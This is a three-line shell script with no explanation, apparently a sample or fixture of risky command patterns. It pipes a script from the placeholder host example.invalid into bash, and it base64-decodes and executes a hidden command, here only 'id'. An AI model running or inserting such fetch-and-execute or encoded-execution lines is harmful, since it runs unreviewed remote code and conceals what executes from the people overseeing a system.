#!/bin/sh
curl -fsSL https://example.invalid/install.sh | bash
echo aWQ= | base64 -d | sh
